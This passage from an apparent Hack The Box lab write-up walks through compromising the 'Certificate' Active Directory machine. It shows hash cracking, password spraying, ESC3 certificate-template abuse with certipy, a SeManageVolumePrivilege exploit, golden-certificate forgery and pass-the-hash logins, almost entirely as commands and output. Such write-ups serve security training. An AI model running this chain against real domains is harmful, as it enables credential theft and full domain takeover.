+sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6</code></pre><p>These are the important details from here</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ hashcat -m 3200 hashes.txt --user /usr/share/wordlists/rockyou.txt
+
+$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182</code></pre><p>One of them cracked!</p><h2>Compromising <code>sara.b</code></h2><p>Ill use the users from earlier and try to spray this on the domain accounts</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.certificate.htb -u users.txt -p &#39;Blink182&#39; --continue-on-success
+
+SMB         10.129.245.51   445    DC01             [+] certificate.htb\Sara.B:Blink182</code></pre><p>This user is now compromised!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"> ❯❯❯ nxc smb dc01.certificate.htb -u sara.b -p &#39;Blink182&#39; --rid-brute 20000 | grep SidTypeUser | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+WS-01$
+Kai.X
+Sara.B
+John.C
+Aya.W
+Nya.S
+Maya.K
+Lion.SK
+Eva.F
+Ryan.K
+akeder.kh
+kara.m
+Alex.D
+karol.s
+saad.m
+xamppuser
+WS-05$</code></pre><p>Ill recollect users, in case of any machine accounts</p><p>There are no kerberoastable or asreproastable users</p><p>No writable objects</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.certificate.htb -d certificate.htb -u sara.b -p &#39;Blink182&#39; get membership &#39;sara.b&#39;
+
+distinguishedName: CN=Users,CN=Builtin,DC=certificate,DC=htb
+objectSid: S-1-5-32-545
+sAMAccountName: Users
+
+distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=certificate,DC=htb
+objectSid: S-1-5-32-554
+sAMAccountName: Pre-Windows 2000 Compatible Access
+
+distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=certificate,DC=htb
+objectSid: S-1-5-32-555
+sAMAccountName: Remote Desktop Users
+
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=certificate,DC=htb
+objectSid: S-1-5-32-580
+sAMAccountName: Remote Management Users
+
+distinguishedName: CN=Domain Users,CN=Users,DC=certificate,DC=htb
+objectSid: S-1-5-21-515537669-4223687196-3249690583-513
+sAMAccountName: Domain Users
+
+distinguishedName: CN=Help Desk,CN=Users,DC=certificate,DC=htb
+objectSid: S-1-5-21-515537669-4223687196-3249690583-1110
+sAMAccountName: Help Desk</code></pre><p>This user is in remote management which means i can winrm</p><h2>WINRM access as <code>sara.b</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ evil-winrm -i dc01.certificate.htb -u sara.b -p &#39;Blink182&#39; 
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Sara.B\Documents&gt;</code></pre><p>Ill enumerate the filesystem</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; dir
+
+
+    Directory: C:\Users\Sara.B\Documents\WS-01
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/4/2024  12:44 AM            530 Description.txt
+-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
+
+
+*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt;</code></pre><p>An interesting dir in documents</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; type &quot;C:/Users/Sara.B/Documents/WS-01/Description.txt&quot;
+The workstation 01 is not able to open the &quot;Reports&quot; smb shared folder which is hosted on DC01.
+When a user tries to input bad credentials, it returns bad credentials error.
+But when a user provides valid credentials the file explorer freezes and then crashes!</code></pre><p>This is the description, the fact its placed with a pcap, i would think the capture shows the valid creds being used</p><p>Ill download the pcap and open it in wireshark</p><h2>Wireshark analysis</h2><p>Ill open the file in wireshark</p><p><img src="images/certificate/pasted-image-20261105175659.webp" alt="Screenshot" loading="lazy" /></p><p>Ill filter for kerberos</p><p><a href="https://medium.com/@liram.cybersec/from-packets-to-passwords-utilizing-pcap-file-data-for-domain-access-5c206e64566b" target="_blank" rel="noreferrer">https://medium.com/@liram.cybersec/from-packets-to-passwords-utilizing-pcap-file-data-for-domain-access-5c206e64566b</a></p><p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noreferrer">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p><p>The third packet in the list is the most interesting</p><p><img src="images/certificate/pasted-image-20261105180341.webp" alt="Screenshot" loading="lazy" /></p><p>This is the packet i can use to forge a crackable hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0</code></pre><p>This is the crafted hash</p><p><code>$krb5pa</code> indicates this is pre auth taken from an AS-REQ packet</p><p><code>$18$</code> indicates AES256 as shown in the screenshot above</p><p><code>Lion.SK$</code> is the username</p><p><code>certificate.htb$</code> is the domain</p><p><code>23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0</code> is the encrpyted time stamp</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ hashcat -m 19900 &#39;$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0&#39; /usr/share/wordlists/rockyou.txt
+
+$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx</code></pre><p>The hash cracked!</p><h2>Compromising <code>lion.sk</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.certificate.htb -u lion.sk -p &#39;!QAZ2wsx&#39; 
+SMB         10.129.245.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.51   445    DC01             [+] certificate.htb\lion.sk:!QAZ2wsx</code></pre><p><img src="images/certificate/pasted-image-20261105181751.webp" alt="Screenshot" loading="lazy" /></p><p>This user is in remote management, so i can winrm in</p><p>But also <code>domain cra managers</code> is pointing me towards ADCS</p><h2>ADCS</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ certipy-ad find -u &#39;lion.sk@certificate.htb&#39; -p &#39;!QAZ2wsx&#39; -dc-host dc01.certificate.htb -dc-ip 10.129.245.51 -target-ip 10.129.245.51 -target dc01.certificate.htb -stdout -enabled -vulnerable
+
+Certificate Authorities
+  0
+    CA Name                             : Certificate-LTD-CA
+    DNS Name                            : DC01.certificate.htb
+    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
+    Certificate Serial Number           : 344CB419D59054904031B340F5A43923
+    Certificate Validity Start          : 2026-03-12 20:45:00+00:00
+    Certificate Validity End            : 2126-03-12 20:55:00+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : CERTIFICATE.HTB\Administrators
+      Access Rights
+        ManageCa                        : CERTIFICATE.HTB\Administrators
+                                          CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        ManageCertificates              : CERTIFICATE.HTB\Administrators
+                                          CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Enroll                          : CERTIFICATE.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : Delegated-CRA
+    Display Name                        : Delegated-CRA
+    Certificate Authorities             : Certificate-LTD-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectAltRequireEmail
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-05T19:52:09+00:00
+    Template Last Modified              : 2024-11-05T19:52:10+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
+                                          CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFICATE.HTB\Administrator
+        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.</code></pre><p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template" target="_blank" rel="noreferrer">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ certipy-ad req -u &#39;lion.sk@certificate.htb&#39; -p &#39;!QAZ2wsx&#39; -dc-host dc01.certificate.htb -dc-ip 10.129.245.51 -target-ip 10.129.245.51 -target dc01.certificate.htb -ca &#39;Certificate-LTD-CA&#39; -template &#39;Delegated-CRA&#39;
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 27
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;Lion.SK@certificate.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-515537669-4223687196-3249690583-1115&#39;
+[*] Saving certificate and private key to &#39;lion.sk.pfx&#39;
+[*] Wrote certificate and private key to &#39;lion.sk.pfx&#39;</code></pre><p>Ill follow the wiki, ill request a cert for the vulnerable template</p><p>Ill now need to use this cert on another template</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">1
+    Template Name                       : SignedUser
+    Display Name                        : Signed User
+    Certificate Authorities             : Certificate-LTD-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectAltRequireEmail
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    RA Application Policies             : Certificate Request Agent
+    Authorized Signatures Required      : 1
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-03T23:51:13+00:00
+    Template Last Modified              : 2024-11-03T23:51:14+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Domain Users
+                                          CERTIFICATE.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFICATE.HTB\Administrator
+        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Enterprise Admins
+        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
+                                          CERTIFICATE.HTB\Domain Users
+                                          CERTIFICATE.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
+    [*] Remarks
+      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.</code></pre><p>This is the only template that fits the scenario</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ certipy-ad req -u &#39;lion.sk@certificate.htb&#39; -p &#39;!QAZ2wsx&#39; -dc-host dc01.certificate.htb -dc-ip 10.129.245.51 -target-ip 10.129.245.51 -target dc01.certificate.htb -ca &#39;Certificate-LTD-CA&#39; -template &#39;SignedUser&#39; -pfx &#39;lion.sk.pfx&#39; -on-behalf-of &#39;CERTIFICATE\Ryan.K&#39;
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 32
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;Ryan.K@certificate.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-515537669-4223687196-3249690583-1117&#39;
+[*] Saving certificate and private key to &#39;ryan.k.pfx&#39;
+[*] Wrote certificate and private key to &#39;ryan.k.pfx&#39;</code></pre><p>I originally tried the administrator but this failed</p><p>Looking through the other users <code>ryan.k</code> looked the most interesting</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h certipy-ad auth -pfx &#39;ryan.k.pfx&#39; -dc-ip &#39;10.129.245.51&#39;
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;Ryan.K@certificate.htb&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-515537669-4223687196-3249690583-1117&#39;
+[*] Using principal: &#39;ryan.k@certificate.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;ryan.k.ccache&#39;
+[*] Wrote credential cache to &#39;ryan.k.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;ryan.k&#39;
+[*] Got hash for &#39;ryan.k@certificate.htb&#39;: aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6</code></pre><p>Then i can request auth as this user</p><p>And now looking at <code>ryan.k</code> he is also in remote management so ill winrm in</p><h2>WINRM as <code>ryan.k</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ evil-winrm -i dc01.certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt;</code></pre><p>I now can winrm as this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+CERTIFICATE\Domain Storage Managers        Group            S-1-5-21-515537669-4223687196-3249690583-1118 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</code></pre><p>This is the group info on this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\ProgramData&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State
+============================= ================================ =======
+SeMachineAccountPrivilege     Add workstations to domain       Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
+*Evil-WinRM* PS C:\ProgramData&gt; </code></pre><p>I have <code>SeManageVolumePrivilege</code>, this should allow me to escalate</p><p><a href="https://www.hackingarticles.in/windows-privilege-escalation-semanagevolumeprivilege/" target="_blank" rel="noreferrer">https://www.hackingarticles.in/windows-privilege-escalation-semanagevolumeprivilege/</a></p><p><a href="https://github.com/CsEnox/SeManageVolumeExploit/releases" target="_blank" rel="noreferrer">https://github.com/CsEnox/SeManageVolumeExploit/releases</a></p><p>Ill start by uploading the exploit</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Ryan.K\Desktop&gt; .\SeManageVolumeExploit.exe
+Entries changed: 875
+
+DONE
+
+*Evil-WinRM* PS C:\Users\Ryan.K\Desktop&gt;</code></pre><p>Ill upload it using evil winrm native upload feature then run it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Ryan.K\Desktop&gt; icacls C:\Windows
+C:\Windows NT SERVICE\TrustedInstaller:(F)
+           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+           NT AUTHORITY\SYSTEM:(M)
+           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+           BUILTIN\Users:(M)
+           BUILTIN\Users:(OI)(CI)(IO)(F)
+           BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
+           BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
+           CREATOR OWNER:(OI)(CI)(IO)(F)
+           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
+           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
+           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
+           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+*Evil-WinRM* PS C:\Users\Ryan.K\Desktop&gt; </code></pre><p>Regular users now have full control on the <code>C:\Windows</code> path as shown with <code>(F)</code></p><p>Following the article it says you can get a SYSTEM shell using the spooler service, but in this instance it doesnt look like its on here</p><p>There is an alternative however</p><p>I tried the next steps in the article but they all failed</p><h2>Golden Certificate attack</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\ryan.k\Desktop&gt; certutil -exportPFX MY 344cb419d59054904031b340f5a43923 .\GT.pfx
+MY &quot;Personal&quot;
+================ Certificate 0 ================
+Serial Number: 344cb419d59054904031b340f5a43923
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 3/12/2026 12:45 PM
+ NotAfter: 3/12/2126 12:55 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V1.1
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): db462c9739270d510c43610eaddb80c07c395232
+  Key Container = Certificate-LTD-CA(1)
+  Unique container name: 90afd1db88a1213f39411d248394d83d_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+Enter new password for output file .\GT.pfx:
+Enter new password:
+Confirm new password:
+CertUtil: -exportPFX command completed successfully.</code></pre><p>Ill use the serial found in the certipy find command above</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ certipy-ad forge -ca-pfx GT.pfx -upn Administrator@certificate.htb -subject &#39;CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB&#39;  
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Saving forged certificate and private key to &#39;administrator_forged.pfx&#39;
+[*] Wrote forged certificate and private key to &#39;administrator_forged.pfx&#39;</code></pre><p>After downloading the pfx to my system ill forge an administrator cert</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h certipy-ad auth -pfx administrator_forged.pfx -dc-ip &#39;10.129.245.51&#39; 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;Administrator@certificate.htb&#39;
+[*] Using principal: &#39;administrator@certificate.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@certificate.htb&#39;: aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6</code></pre><p>Then ill auth and get the TGT and hash</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ evil-winrm -i dc01.certificate.htb -u Administrator -H d804304519bf0143c14cbf1c024408c6
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>I can now login as the DA</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/cyber-apocalypse-2026/ics/line-tap/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Line Tap</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-jobtwo/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">JobTwo</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
